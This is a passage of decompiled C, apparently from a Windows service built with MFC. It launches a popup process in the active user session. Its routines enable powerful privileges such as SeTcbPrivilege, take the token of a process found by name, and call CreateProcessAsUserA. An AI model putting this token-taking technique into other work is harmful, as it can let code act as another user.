      sprintf((char *)(unaff_EBP + -0x24c),s_ActSess__d__LastSess__d_0040e8f8,iVar2,
              *(undefined4 *)(unaff_EBP + -0x10));
      OutputDebugStringA((LPCSTR)(unaff_EBP + -0x24c));
      if (*(int *)(unaff_EBP + -0x14) != *(int *)(unaff_EBP + -0x10)) {
        WaitForSingleObject(DAT_0040f038,60000);
        *(undefined4 *)(unaff_EBP + -0x10) = *(undefined4 *)(unaff_EBP + -0x14);
        FUN_00409860((char *)(unaff_EBP + -0x120),s__Popup_0040e828,(LPCSTR)0x0,(HANDLE *)0x0,
                     (uchar *)0x0,-1);
      }
      WaitForSingleObject(DAT_0040f038,60000);
    }
    WaitForSingleObject(DAT_0040f038,0xffffffff);
    CloseHandle(DAT_0040f038);
    DAT_0040f038 = (HANDLE)0x0;
    FUN_00409572(1,0,0);
    *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
    FUN_00402dd9();
  }
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



DWORD __cdecl FUN_00409572(DWORD param_1,DWORD param_2,DWORD param_3)

{
  BOOL BVar1;
  int iVar2;
  DWORD DVar3;
  DWORD *pDVar4;
  _SERVICE_STATUS local_20;
  
  pDVar4 = &local_20.dwCurrentState;
  for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {
    *pDVar4 = 0;
    pDVar4 = pDVar4 + 1;
  }
  DVar3 = 0;
  local_20.dwCurrentState = param_1;
  DAT_0040f03c = param_1;
  local_20.dwServiceType = 0x30;
  local_20.dwWin32ExitCode = param_2;
  local_20.dwCheckPoint = param_3;
  local_20.dwControlsAccepted = 4;
  local_20.dwServiceSpecificExitCode = 0;
  local_20.dwWaitHint = 100;
  BVar1 = SetServiceStatus(DAT_0040f034,&local_20);
  if (BVar1 == 0) {
    DVar3 = GetLastError();
  }
  return DVar3;
}



int FUN_00409652(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  int iVar2;
  
  iVar2 = -1;
  hModule = LoadLibraryA(s_Kernel32_dll_0040e930);
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_WTSGetActiveConsoleSessionId_0040e910);
    if (pFVar1 != (FARPROC)0x0) {
      iVar2 = (*pFVar1)();
    }
    FreeLibrary(hModule);
  }
  return iVar2;
}



BOOL __cdecl FUN_00409688(LPCSTR param_1,int param_2)

{
  HANDLE ProcessHandle;
  BOOL BVar1;
  BOOL BVar2;
  DWORD DesiredAccess;
  HANDLE *TokenHandle;
  _TOKEN_PRIVILEGES local_18;
  HANDLE local_8;
  
  TokenHandle = &local_8;
  DesiredAccess = 8;
  ProcessHandle = GetCurrentProcess();
  BVar1 = OpenProcessToken(ProcessHandle,DesiredAccess,TokenHandle);
  if (BVar1 == 0) {
    return 0;
  }
  BVar2 = 0;
  local_18.Privileges[0].Attributes = -(uint)(param_2 != 0) & 2;
  local_18.PrivilegeCount = 1;
  BVar1 = LookupPrivilegeValueA((LPCSTR)0x0,param_1,&local_18.Privileges[0].Luid);
  if (BVar1 != 0) {
    BVar2 = AdjustTokenPrivileges(local_8,0,&local_18,0,(PTOKEN_PRIVILEGES)0x0,(PDWORD)0x0);
  }
  CloseHandle(local_8);
  return BVar2;
}



undefined4 __cdecl FUN_004096f1(uchar *param_1,int param_2)

{
  BOOL BVar1;
  DWORD DVar2;
  int iVar3;
  undefined *TokenInformation;
  undefined1 unaff_BP;
  undefined4 *puVar4;
  DWORD local_1124;
  undefined4 local_1120 [1023];
  uchar local_124;
  undefined4 local_123;
  undefined4 uStackY_28;
  uint uVar5;
  undefined *hProcess;
  DWORD *pDVar6;
  HANDLE TokenHandle;
  
  FUN_0040a2a0(unaff_BP);
  local_124 = '\0';
  local_1124 = 0;
  puVar4 = local_1120;
  for (iVar3 = 0x3ff; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  puVar4 = &local_123;
  for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  *(undefined *)((int)puVar4 + 2) = 0;
  uVar5 = 0x1000;
  TokenHandle = (HANDLE)0x0;
  BVar1 = EnumProcesses(&local_1124,0x1000,(LPDWORD)&stack0xffffffe8);
  if (BVar1 == 0) {
    GetLastError();
  }
  else {
    TokenInformation = (undefined *)(uVar5 >> 2);
    if (TokenInformation != (undefined *)0x0) {
      pDVar6 = &local_1124;
      hProcess = (undefined *)0x4;
      do {
        DVar2 = *pDVar6;
        if ((DVar2 != 0) && (DVar2 != 4)) {
          TokenInformation = (undefined *)0x410;
          hProcess = (undefined *)OpenProcess(0x410,0,DVar2);
          if (hProcess == (undefined *)0x0) {
            hProcess = (undefined *)0x4097ab;
            GetLastError();
          }
          else {
            memset(&local_124,0,0x104);
            TokenInformation = (undefined *)0x0;
            DVar2 = GetModuleBaseNameA(hProcess,(HMODULE)0x0,(LPSTR)&local_124,0x104);
            if (DVar2 == 0) {
LAB_004097d6:
              GetLastError();
            }
            else {
              TokenInformation = (undefined *)0x4097ee;
              iVar3 = _mbsicmp(&local_124,param_1);
              if (iVar3 == 0) {
                TokenInformation = hProcess;
                BVar1 = OpenProcessToken(hProcess,8,(PHANDLE)&stack0xfffffff8);
                if (BVar1 == 0) goto LAB_004097d6;
                iVar3 = 0;
                TokenInformation = &stack0xfffffff4;
                uStackY_28 = 0x409820;
                GetTokenInformation(TokenHandle,TokenOwner,TokenInformation,4,
                                    (PDWORD)&stack0xffffffe0);
                if (iVar3 == param_2) {
                  CloseHandle(hProcess);
                  return TokenHandle;
                }
                CloseHandle(TokenHandle);
              }
            }
            CloseHandle(hProcess);
          }
        }
        hProcess = hProcess + 1;
        pDVar6 = pDVar6 + 1;
      } while (hProcess < TokenInformation);
    }
  }
  return 0;
}



DWORD __cdecl
FUN_00409860(char *param_1,char *param_2,LPCSTR param_3,HANDLE *param_4,uchar *param_5,int param_6)

{
  size_t sVar1;
  BOOL BVar2;
  LPSTR _Dest;
  HANDLE pvVar3;
  int iVar4;
  int iVar5;
  LPSTR *ppCVar6;
  _STARTUPINFOA local_6c;
  _PROCESS_INFORMATION local_28;
  HANDLE local_18;
  HANDLE local_14;
  int local_10;
  DWORD local_c;
  HANDLE local_8;
  
  local_c = 0;
  local_10 = 0;
  iVar5 = 0;
  local_8 = (HANDLE)0x0;
  local_14 = (HANDLE)0x0;
  local_18 = GetCurrentProcess();
  local_6c.cb = 0;
  ppCVar6 = &local_6c.lpReserved;
  for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {
    *ppCVar6 = (LPSTR)0x0;
    ppCVar6 = ppCVar6 + 1;
  }
  local_28.hProcess = (HANDLE)0x0;
  local_28.hThread = (HANDLE)0x0;
  local_28.dwProcessId = 0;
  local_28.dwThreadId = 0;
  FUN_00409688(s_SeTcbPrivilege_0040e9a4,1);
  FUN_00409688(s_SeChangeNotifyPrivilege_0040e98c,1);
  FUN_00409688(s_SeIncreaseQuotaPrivilege_0040e970,1);
  FUN_00409688(s_SeAssignPrimaryTokenPrivilege_0040e950,1);
  if (param_6 == -1) {
    param_6 = FUN_00409652();
  }
  local_10 = param_6;
  if (param_6 == -1) {
    local_10 = 0;
  }
  if (param_5 != (uchar *)0x0) {
    sVar1 = strlen((char *)param_5);
    if (sVar1 != 0) {
      local_8 = (HANDLE)FUN_004096f1(param_5,local_10);
    }
  }
  if (local_8 == (HANDLE)0x0) {
    BVar2 = OpenProcessToken(local_18,0xf01ff,&local_8);
    if (BVar2 != 0) {
      BVar2 = DuplicateTokenEx(local_8,0x2000000,(LPSECURITY_ATTRIBUTES)0x0,SecurityIdentification,
                               TokenPrimary,&local_14);
      if (BVar2 != 0) {
        BVar2 = SetTokenInformation(local_14,TokenSessionId,&local_10,4);
        if (BVar2 != 0) goto LAB_0040995b;
      }
    }
    local_c = GetLastError();
    goto LAB_00409a80;
  }
LAB_0040995b:
  local_6c.cb = 0x44;
  local_6c.lpDesktop = s_WinSta0_Default_0040e940;
  if (param_1 != (char *)0x0) {
    sVar1 = strlen(param_1);
    iVar5 = sVar1 + 2;
  }
  if (param_2 != (char *)0x0) {
    if (iVar5 != 0) {
      iVar5 = iVar5 + 1;
    }
    sVar1 = strlen(param_2);
    iVar5 = iVar5 + sVar1;
  }
  _Dest = (LPSTR)operator_new(iVar5 + 1U);
  memset(_Dest,0,iVar5 + 1U);
  if (param_1 == (char *)0x0) {
    strcpy(_Dest,param_2);
  }
  else if (param_2 == (char *)0x0) {
    wsprintfA(_Dest,&DAT_0040e5b8,param_1);
  }
  else {
    wsprintfA(_Dest,s___s___s_0040e5c0,param_1,param_2);
  }
  pvVar3 = local_14;
  if (local_14 == (HANDLE)0x0) {
    pvVar3 = local_8;
  }
  BVar2 = CreateProcessAsUserA
                    (pvVar3,(LPCSTR)0x0,_Dest,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,
                     0,0x30,(LPVOID)0x0,param_3,&local_6c,&local_28);
  if (BVar2 == 0) {
    local_c = GetLastError();
    if (local_c == 0x57) {
      local_c = 0;
      pvVar3 = local_14;
      if (local_14 == (HANDLE)0x0) {
        pvVar3 = local_8;
      }
      BVar2 = CreateProcessAsUserA
                        (pvVar3,(LPCSTR)0x0,_Dest,(LPSECURITY_ATTRIBUTES)0x0,
                         (LPSECURITY_ATTRIBUTES)0x0,0,0x30,(LPVOID)0x0,param_3,&local_6c,&local_28);
      if (BVar2 != 0) goto LAB_00409a52;
      local_c = GetLastError();
    }
  }
  else {
LAB_00409a52:
    if (param_4 == (HANDLE *)0x0) {
      CloseHandle(local_28.hProcess);
      CloseHandle(local_28.hThread);
    }
    else {
      *param_4 = local_28.hProcess;
      param_4[1] = local_28.hThread;
      param_4[2] = (HANDLE)local_28.dwProcessId;
      param_4[3] = (HANDLE)local_28.dwThreadId;
    }
  }
  if (_Dest != (LPSTR)0x0) {
    operator_delete(_Dest);
  }
LAB_00409a80:
  if (local_8 != (HANDLE)0x0) {
    CloseHandle(local_8);
  }
  if (local_14 != (HANDLE)0x0) {
    CloseHandle(local_14);
  }
  if (local_18 != (HANDLE)0x0) {
    CloseHandle(local_18);
  }
  return local_c;
}



undefined4 * FUN_00409ab2(void)

{
  HINSTANCE__ *hInstance;
  HICON pHVar1;
  undefined4 *this;
  int unaff_EBP;
  LPCSTR lpIconName;
  
  FUN_0040a1d0();
  *(undefined4 **)(unaff_EBP + -0x10) = this;
  CDialog::CDialog((CDialog *)this,0x66,*(CWnd **)(unaff_EBP + 8));
  *(undefined4 *)(unaff_EBP + -4) = 0;
  CWnd::CWnd((CWnd *)(this + 0x18));
  this[0x18] = &PTR_LAB_0040bf00;
  *(undefined *)(unaff_EBP + -4) = 1;
  CString::CString((CString *)(this + 0x29));
  *(undefined *)(unaff_EBP + -4) = 2;
  *this = &PTR_LAB_0040c200;
  AfxGetModuleState();
  lpIconName = (LPCSTR)0x80;
  hInstance = AfxFindResourceHandle((char *)0x80,(char *)0xe);
  pHVar1 = LoadIconA(hInstance,lpIconName);
  this[0x28] = pHVar1;
  memset(this + 0x2c,0,0x100);
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  this[0x6c] = 0;
  this[0x2a] = 0;
  this[0x2b] = 0;
  return this;
}



void * __thiscall FUN_00409b57(void *this,byte param_1)

{
  FUN_004092ed();
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return this;
}



undefined4 __fastcall FUN_00409b8e(CDialog *param_1)

{
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined local_14 [16];
  
  CDialog::OnInitDialog(param_1);
  SendMessageA(*(HWND *)(param_1 + 0x20),0x80,1,*(LPARAM *)(param_1 + 0xa0));
  SendMessageA(*(HWND *)(param_1 + 0x20),0x80,0,*(LPARAM *)(param_1 + 0xa0));
  Ordinal_8(local_14);
  FUN_00408983((CWnd *)(param_1 + 0x60),extraout_DL,1);
  if (*(int *)(*(int *)(param_1 + 0xa4) + -8) != 0) {
    FUN_00408923((CWnd *)(param_1 + 0x60),extraout_DL_00,*(int *)(param_1 + 0xa4),local_14,local_14,
                 local_14,local_14);
  }
  if (*(UINT *)(param_1 + 0xac) != 0) {
    SetTimer(*(HWND *)(param_1 + 0x20),1,*(UINT *)(param_1 + 0xac),(TIMERPROC)0x0);
  }
  return 1;
}



void __fastcall FUN_00409c23(CWnd *param_1)

{
  BOOL BVar1;
  int iVar2;
  int iVar3;
  CPaintDC local_68 [4];
  HDC local_64;
  tagRECT local_14;
  
  BVar1 = IsIconic(*(HWND *)(param_1 + 0x20));
  if (BVar1 == 0) {
    CWnd::Default(param_1);
  }
  else {
    CPaintDC::CPaintDC(local_68,param_1);
    SendMessageA(*(HWND *)(param_1 + 0x20),0x27,
                 -(uint)(&stack0x00000000 != (undefined *)0x68) & (uint)local_64,0);
    iVar2 = GetSystemMetrics(0xb);
    iVar3 = GetSystemMetrics(0xc);
    GetClientRect(*(HWND *)(param_1 + 0x20),&local_14);
    DrawIcon(local_64,(((local_14.right - local_14.left) - iVar2) + 1) / 2,
             (((local_14.bottom - local_14.top) - iVar3) + 1) / 2,*(HICON *)(param_1 + 0xa0));
    CPaintDC::~CPaintDC(local_68);
  }
  return;
}



void FUN_00409d68(void)

{
  undefined4 uVar1;
  void *pvVar2;
  CWnd *pCVar3;
  CWnd *extraout_ECX;
  int unaff_EBP;
  undefined4 *this;
  
  FUN_0040a1d0();
  pvVar2 = operator_new(0x1b4);
  *(void **)(unaff_EBP + -0x10) = pvVar2;
  this = (undefined4 *)0x0;
  *(undefined4 *)(unaff_EBP + -4) = 0;
  if (pvVar2 != (void *)0x0) {
    this = FUN_00409ab2();
  }
  uVar1 = *(undefined4 *)(extraout_ECX + 0xa8);
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  this[0x2a] = uVar1;
  this[0x2b] = *(undefined4 *)(extraout_ECX + 0xac);
  CDialog::Create((CDialog *)this,(char *)0x66,extraout_ECX);
  pCVar3 = FUN_00408962((CWnd *)(this + 0x18));
  **(CWnd ***)(unaff_EBP + 8) = pCVar3;
  CWnd::ShowWindow((CWnd *)this,5);
  *(undefined4 **)(extraout_ECX + *(int *)(extraout_ECX + 0x1b0) * 4 + 0xb0) = this;
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  *(int *)(extraout_ECX + 0x1b0) = *(int *)(extraout_ECX + 0x1b0) + 1;
  return;
}



void __thiscall FUN_00409df9(void *this,uint param_1,uint param_2,int param_3)

{
  int *piVar1;
  int iVar2;
  
  if ((param_1 == 2) || (param_1 == 0x10)) {
    KillTimer(*(HWND *)((int)this + 0x20),1);
    FUN_0040894f((CWnd *)((int)this + 0x60));
    iVar2 = *(int *)((int)this + 0x1b0);
    while (iVar2 != 0) {
      piVar1 = *(int **)((int)this + *(int *)((int)this + 0x1b0) * 4 + 0xac);
      if (piVar1 != (int *)0x0) {
        (**(code **)(*piVar1 + 4))(1);
      }
      piVar1 = (int *)((int)this + 0x1b0);
      *piVar1 = *piVar1 + -1;
      iVar2 = *piVar1;
    }
  }
  else if (param_1 == 0x46) {
    if (*(int *)((int)this + 0xa8) != 0) {
      *(uint *)(param_3 + 0x18) = *(uint *)(param_3 + 0x18) & 0xffffffbf;
    }
  }
  else if (param_1 == 0x112) {
    if ((param_2 == 0xf060) && (this == DAT_0040eed0)) {
      KillTimer(*(HWND *)((int)this + 0x20),1);
    }
  }
  else if (param_1 == 0x113) {
    KillTimer(*(HWND *)((int)this + 0x20),1);
    PostMessageA(*(HWND *)((int)this + 0x20),0x112,0xf060,0);
  }
  CWnd::WindowProc((CWnd *)this,param_1,param_2,param_3);
  return;
}



int __thiscall CDialog::DoModal(CDialog *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00409f3a. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = DoModal(this);
  return iVar1;
}



long __thiscall CWnd::WindowProc(CWnd *this,uint param_1,uint param_2,long param_3)

{
  long lVar1;
  
                    // WARNING: Could not recover jumptable at 0x00409f6a. Too many branches
                    // WARNING: Treating indirect jump as call
  lVar1 = WindowProc(this,param_1,param_2,param_3);
  return lVar1;
}



void __thiscall CString::~CString(CString *this)

{
                    // WARNING: Could not recover jumptable at 0x0040a030. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CString(this);
  return;
}



void __thiscall CComboBox::~CComboBox(CComboBox *this)

{
                    // WARNING: Could not recover jumptable at 0x0040a036. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CComboBox(this);
  return;
}



void __thiscall CListCtrl::~CListCtrl(CListCtrl *this)

{
                    // WARNING: Could not recover jumptable at 0x0040a03c. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CListCtrl(this);
  return;
}



void __thiscall CDialog::~CDialog(CDialog *this)

{
                    // WARNING: Could not recover jumptable at 0x0040a042. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CDialog(this);
  return;
}



HINSTANCE__ * AfxFindResourceHandle(char *param_1,char *param_2)

{
  HINSTANCE__ *pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a048. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = AfxFindResourceHandle(param_1,param_2);
  return pHVar1;
}



AFX_MODULE_STATE * AfxGetModuleState(void)

{
  AFX_MODULE_STATE *pAVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a04e. Too many branches
                    // WARNING: Treating indirect jump as call
  pAVar1 = AfxGetModuleState();
  return pAVar1;
}



CString * __thiscall CString::operator=(CString *this,char *param_1)

{
  CString *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a054. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = operator=(this,param_1);
  return pCVar1;
}



void __thiscall CString::CString(CString *this)

{
                    // WARNING: Could not recover jumptable at 0x0040a05a. Too many branches
                    // WARNING: Treating indirect jump as call
  CString(this);
  return;
}



void __thiscall CWnd::CWnd(CWnd *this)

{
                    // WARNING: Could not recover jumptable at 0x0040a060. Too many branches
                    // WARNING: Treating indirect jump as call
  CWnd(this);
  return;
}



void __thiscall CDialog::CDialog(CDialog *this,uint param_1,CWnd *param_2)

{
                    // WARNING: Could not recover jumptable at 0x0040a066. Too many branches
                    // WARNING: Treating indirect jump as call
  CDialog(this,param_1,param_2);
  return;
}



void __cdecl operator_delete(void *param_1)

{
                    // WARNING: Could not recover jumptable at 0x0040a06c. Too many branches
                    // WARNING: Treating indirect jump as call
  operator_delete(param_1);
  return;
}



void DDX_Check(CDataExchange *param_1,int param_2,int *param_3)

{
                    // WARNING: Could not recover jumptable at 0x0040a072. Too many branches
                    // WARNING: Treating indirect jump as call
  DDX_Check(param_1,param_2,param_3);
  return;
}



void DDX_Text(CDataExchange *param_1,int param_2,int *param_3)

{
                    // WARNING: Could not recover jumptable at 0x0040a078. Too many branches
                    // WARNING: Treating indirect jump as call
  DDX_Text(param_1,param_2,param_3);
  return;
}



void DDX_Text(CDataExchange *param_1,int param_2,CString *param_3)

{
                    // WARNING: Could not recover jumptable at 0x0040a07e. Too many branches
                    // WARNING: Treating indirect jump as call
  DDX_Text(param_1,param_2,param_3);
  return;
}



void DDX_Control(CDataExchange *param_1,int param_2,CWnd *param_3)

{
                    // WARNING: Could not recover jumptable at 0x0040a084. Too many branches
                    // WARNING: Treating indirect jump as call
  DDX_Control(param_1,param_2,param_3);
  return;
}



void __thiscall CString::CString(CString *this,CString *param_1)

{
                    // WARNING: Could not recover jumptable at 0x0040a08a. Too many branches
                    // WARNING: Treating indirect jump as call
  CString(this,param_1);
  return;
}



CString * __thiscall CString::operator+=(CString *this,CString *param_1)

{
  CString *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a090. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = operator+=(this,param_1);
  return pCVar1;
}



CString * __thiscall CString::operator+=(CString *this,char *param_1)

{
  CString *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a096. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = operator+=(this,param_1);
  return pCVar1;
}



CString * __thiscall CString::operator=(CString *this,CString *param_1)

{
  CString *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a09c. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = operator=(this,param_1);
  return pCVar1;
}



void __thiscall CListCtrl::GetItemText(void)

{
                    // WARNING: Could not recover jumptable at 0x0040a0a2. Too many branches
                    // WARNING: Treating indirect jump as call
  GetItemText();
  return;
}



char * __thiscall CString::GetBuffer(CString *this,int param_1)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a0a8. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = GetBuffer(this,param_1);
  return pcVar1;
}



void * __cdecl operator_new(uint param_1)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a0ae. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = operator_new(param_1);
  return pvVar1;
}



ulong __thiscall CListCtrl::GetItemData(CListCtrl *this,int param_1)

{
  ulong uVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a0b4. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = GetItemData(this,param_1);
  return uVar1;
}



int __thiscall CWnd::MessageBoxA(CWnd *this,char *param_1,char *param_2,uint param_3)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a0ba. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = MessageBoxA(this,param_1,param_2,param_3);
  return iVar1;
}



int __thiscall CWnd::UpdateData(CWnd *this,int param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a0c0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = UpdateData(this,param_1);
  return iVar1;
}



int __thiscall
CListCtrl::SetItem(CListCtrl *this,int param_1,int param_2,uint param_3,char *param_4,int param_5,
                  uint param_6,uint param_7,long param_8)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a0c6. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = SetItem(this,param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
  return iVar1;
}



int __thiscall CListCtrl::SetItemText(CListCtrl *this,int param_1,int param_2,char *param_3)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a0cc. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = SetItemText(this,param_1,param_2,param_3);
  return iVar1;
}



int __thiscall
CListCtrl::InsertItem
          (CListCtrl *this,uint param_1,int param_2,char *param_3,uint param_4,uint param_5,
          int param_6,long param_7)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a0d2. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = InsertItem(this,param_1,param_2,param_3,param_4,param_5,param_6,param_7);
  return iVar1;
}



int __thiscall
CListCtrl::InsertColumn
          (CListCtrl *this,int param_1,char *param_2,int param_3,int param_4,int param_5)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a0d8. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = InsertColumn(this,param_1,param_2,param_3,param_4,param_5);
  return iVar1;
}



int __thiscall CDialog::OnInitDialog(CDialog *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a0de. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = OnInitDialog(this);
  return iVar1;
}



void __thiscall CComboBox::GetLBText(CComboBox *this,int param_1,CString *param_2)

{
                    // WARNING: Could not recover jumptable at 0x0040a0e4. Too many branches
                    // WARNING: Treating indirect jump as call
  GetLBText(this,param_1,param_2);
  return;
}



void __thiscall CWnd::GetWindowTextA(CWnd *this,CString *param_1)

{
                    // WARNING: Could not recover jumptable at 0x0040a0ea. Too many branches
                    // WARNING: Treating indirect jump as call
  GetWindowTextA(this,param_1);
  return;
}



long __thiscall CWnd::Default(CWnd *this)

{
  long lVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a0f0. Too many branches
                    // WARNING: Treating indirect jump as call
  lVar1 = Default(this);
  return lVar1;
}



void __thiscall CString::Format(CString *this,char *param_1,...)

{
                    // WARNING: Could not recover jumptable at 0x0040a0f6. Too many branches
                    // WARNING: Treating indirect jump as call
  Format(this,param_1);
  return;
}



void __thiscall CPaintDC::~CPaintDC(CPaintDC *this)

{
                    // WARNING: Could not recover jumptable at 0x0040a0fc. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CPaintDC(this);
  return;
}



void __thiscall CPaintDC::CPaintDC(CPaintDC *this,CWnd *param_1)

{
                    // WARNING: Could not recover jumptable at 0x0040a102. Too many branches
                    // WARNING: Treating indirect jump as call
  CPaintDC(this,param_1);
  return;
}



int __thiscall
CWnd::CreateControl(CWnd *this,_GUID *param_1,char *param_2,ulong param_3,tagRECT *param_4,
                   CWnd *param_5,uint param_6,CFile *param_7,int param_8,ushort *param_9)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a108. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = CreateControl(this,param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9
                       );
  return iVar1;
}



void __thiscall CWnd::~CWnd(CWnd *this)

{
                    // WARNING: Could not recover jumptable at 0x0040a10e. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CWnd(this);
  return;
}



void __thiscall
CWnd::InvokeHelper(CWnd *this,long param_1,ushort param_2,ushort param_3,void *param_4,
                  uchar *param_5,...)

{
                    // WARNING: Could not recover jumptable at 0x0040a114. Too many branches
                    // WARNING: Treating indirect jump as call
  InvokeHelper(this,param_1,param_2,param_3,param_4,param_5);
  return;
}



void __thiscall CWinApp::~CWinApp(CWinApp *this)

{
                    // WARNING: Could not recover jumptable at 0x0040a198. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CWinApp(this);
  return;
}



void __thiscall CWinApp::CWinApp(CWinApp *this,char *param_1)

{
                    // WARNING: Could not recover jumptable at 0x0040a19e. Too many branches
                    // WARNING: Treating indirect jump as call
  CWinApp(this,param_1);
  return;
}



void __cdecl AfxEnableControlContainer(COccManager *param_1)

{
                    // WARNING: Could not recover jumptable at 0x0040a1a4. Too many branches
                    // WARNING: Treating indirect jump as call
  AfxEnableControlContainer(param_1);
  return;
}



int __thiscall CWnd::ShowWindow(CWnd *this,int param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a1b0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = ShowWindow(this,param_1);
  return iVar1;
}



int __thiscall CDialog::Create(CDialog *this,char *param_1,CWnd *param_2)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a1b6. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = Create(this,param_1,param_2);
  return iVar1;
}



void FUN_0040a1d0(void)

{
  undefined auStack_c [12];
  
  ExceptionList = auStack_c;
  return;
}



void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a1f0. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memcpy(_Dst,_Src,_Size);
  return pvVar1;
}



void * __cdecl memset(void *_Dst,int _Val,size_t _Size)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a1f6. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = memset(_Dst,_Val,_Size);
  return pvVar1;
}



char * __cdecl strcpy(char *_Dest,char *_Source)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a1fc. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = strcpy(_Dest,_Source);
  return pcVar1;
}



size_t __cdecl strlen(char *_Str)

{
  size_t sVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a202. Too many branches
                    // WARNING: Treating indirect jump as call
  sVar1 = strlen(_Str);
  return sVar1;
}



int __cdecl strcmp(char *_Str1,char *_Str2)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a208. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = strcmp(_Str1,_Str2);
  return iVar1;
}



int __cdecl memcmp(void *_Buf1,void *_Buf2,size_t _Size)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a20e. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = memcmp(_Buf1,_Buf2,_Size);
  return iVar1;
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio

longlong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



char * __cdecl strcat(char *_Dest,char *_Source)

{
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040a254. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = strcat(_Dest,_Source);
  return pcVar1;
}



void __cdecl FUN_0040a25a(_onexit_t param_1)

{
  if (DAT_0040f064 == -1) {
    _onexit(param_1);
    return;
  }
  __dllonexit(param_1,&DAT_0040f064,&DAT_0040f060);
  return;
}



int __cdecl FUN_0040a286(_onexit_t param_1)

{
  int iVar1;
  
  iVar1 = FUN_0040a25a(param_1);
  return (iVar1 != 0) - 1;
}



// WARNING: Unable to track spacebase fully for stack

void FUN_0040a2a0(undefined1 param_1)

{
  uint in_EAX;
  undefined1 *puVar1;
  undefined4 unaff_retaddr;
  
